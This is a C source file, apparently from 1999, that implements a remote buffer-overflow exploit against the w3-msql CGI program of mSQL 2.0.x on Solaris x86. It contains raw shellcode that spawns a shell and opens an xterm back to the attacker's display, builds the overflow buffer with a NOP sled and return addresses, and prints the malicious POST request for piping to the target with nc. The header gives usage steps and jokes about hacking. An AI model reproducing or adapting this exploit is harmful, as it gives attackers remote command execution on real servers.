/*
 * !Hispahack Research Team
 * http://hispahack.ccc.de
 *
 * Xploit for /cgi-bin/w3-msql (msql 2.0.4.1 - 2.0.11)
 *
 * Platform: Solaris x86
 *           Feel free to port it to other arquitectures, if you can...
 *           If so mail me plz.
 *
 * By: Zhodiac <zhodiac@softhome.net>
 *
 * Steps: 1) gcc -o w3-msql-xploit w3-msql-xploit.c
 *        2) xhost +<target_ip>
 *        3) ./w3-msql-xploit <target> <display> | nc <target> <http_port>
 *        4) Take a cup of cofee, some kind of drug or wathever
 *           estimulates you at hacking time... while the xterm is comming
 *           or while you are getting raided.
 * 
 * #include <standard/disclaimer.h>
 *        
 * Madrid, 28/10/99
 * 
 * Spain r0x
 *        
 */

#include <stdio.h>
#include <string.h>  
#include <stdlib.h>

/******************/
/* Customize this */
/******************/
//#define LEN_VAR         50     /* mSQL 2.0.4 - 2.0.10.1 */
#define LEN_VAR       128    /* mSQL 2.0.11 */

// Solaris x86
#define ADDR 0x8045f8

// Shellcode Solaris x86
char shellcode[]= /* By Zhodiac <zhodiac@softhome.net> */
 "\x8b\x74\x24\xfc\xb8\x2e\x61\x68\x6d\x05\x01\x01\x01\x01\x39\x06"
 "\x74\x03\x46\xeb\xf9\x33\xc0\x89\x46\xea\x88\x46\xef\x89\x46\xfc"
 "\x88\x46\x07\x46\x46\x88\x46\x08\x4e\x4e\x88\x46\xff\xb0\x1f\xfe"
 "\xc0\x88\x46\x21\x88\x46\x2a\x33\xc0\x89\x76\xf0\x8d\x5e\x08\x89"
 "\x5e\xf4\x83\xc3\x03\x89\x5e\xf8\x50\x8d\x5e\xf0\x53\x56\x56\xb0"
 "\x3b\x9a\xaa\xaa\xaa\xaa\x07\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa"
 "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa"
 "/bin/shA-cA/usr/openwin/bin/xtermA-displayA";

#define ADDR_TIMES      12
#define BUFSIZE LEN_VAR+15*1024+LEN_VAR+ADDR_TIMES*4-16
#define NOP     0x90
 
int main (int argc, char *argv[]) {
 
char *buf, *ptr;
long addr=ADDR;
int aux;

 if (argc<3){
   printf("Usage: %s target display | nc target 80 \n",argv[0]);
   exit(-1);
   }

 if ((buf=malloc(BUFSIZE))==NULL) {
       perror("malloc()");
       exit(-1);
      } 

 shellcode[44]=(char)strlen(argv[2])+43;
   
 ptr=(char *)buf;
 memset(ptr,NOP,BUFSIZE-strlen(argv[2])-strlen(shellcode)-ADDR_TIMES*4);
 ptr+=BUFSIZE-strlen(shellcode)-strlen(argv[2])-ADDR_TIMES*4;
 memcpy(ptr,shellcode,strlen(shellcode));
 ptr+=strlen(shellcode);  
 memcpy(ptr,argv[2],strlen(argv[2]));
 ptr+=strlen(argv[2]);

 for (aux=0;aux<ADDR_TIMES;aux++) {
   ptr[0] = (addr & 0x000000ff);
   ptr[1] = (addr & 0x0000ff00) >> 8;
   ptr[2] = (addr & 0x00ff0000) >> 16;
   ptr[3] = (addr & 0xff000000) >> 24;
   ptr+=4;
   }
 
 printf("POST /cgi-bin/w3-msql/index.html HTTP/1.0\n");
 printf("Connection: Keep-Alive\n");
 printf("User-Agent: Mozilla/4.60 [en] (X11; I; Linux 2.0.38 i686\n");
 printf("Host: %s\n",argv[1]);  
 printf("Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg\n");
 printf("Accept-Encoding: gzip\n");   
 printf("Accept-Language: en\n");
 printf("Accept-Charset: iso-8859-1,*,utf-8\n");
 printf("Content-type: multipart/form-data\n");
 printf("Content-length: %i\n\n",BUFSIZE);
 
 printf("%s \n\n\n",buf);
 
 free(buf);
 
}
 


